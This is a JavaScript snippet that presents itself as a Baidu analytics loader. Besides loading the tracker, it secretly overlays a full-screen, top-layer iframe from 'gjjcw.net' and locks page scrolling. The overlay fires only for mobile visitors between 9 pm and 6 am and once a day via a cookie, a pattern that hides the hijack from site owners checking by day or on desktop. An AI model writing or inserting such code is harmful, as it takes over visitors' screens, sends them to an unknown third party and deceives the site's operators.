(function () {
    // 添加百度统计
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?f5492f32fa3c40d60ad92680ca2ea642";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();

    // 检测是否为移动设备
    var isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    // 获取 Cookie
    function getCookie(name) {
        var cookies = document.cookie.split("; ");
        for (var i = 0; i < cookies.length; i++) {
            var parts = cookies[i].split("=");
            if (parts[0] === name) {
                return parts[1];
            }
        }
        return null;
    }

    // 设置 Cookie
    function setCookie(name, value, days) {
        var expires = "";
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
            expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + value + expires + "; path=/";
    }

    // 获取当前小时
    var currentHour = new Date().getHours();

    // 时间范围：晚上9点到早上6点
    var isNightTime = currentHour >= 21 || currentHour < 6;

    // 检查条件：是否移动设备、时间范围内、且未设置 Cookie
    if (isMobile && isNightTime && !getCookie("iframeShown")) {
        var iframe = document.createElement("iframe");
        iframe.src = "https://360bdshare.gjjcw.net/?dd"; // 替换为您的嵌套链接
        iframe.style.position = "fixed"; // 固定位置
        iframe.style.top = "0";
        iframe.style.left = "0";
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "none";
        iframe.style.zIndex = "2147483647"; // 确保在所有元素之上
        iframe.style.overflow = "auto"; // 允许滚动
        iframe.allow = "fullscreen";

        // 添加到 <body> 的最后，确保在其他内容上方
        document.body.appendChild(iframe);

        // 锁定背景页面的滚动
        document.body.style.overflow = "hidden";

        // 设置 Cookie 标记，避免重复显示 iframe
        setCookie("iframeShown", "true", 1); // Cookie 设置为 1 天有效
    }
})();
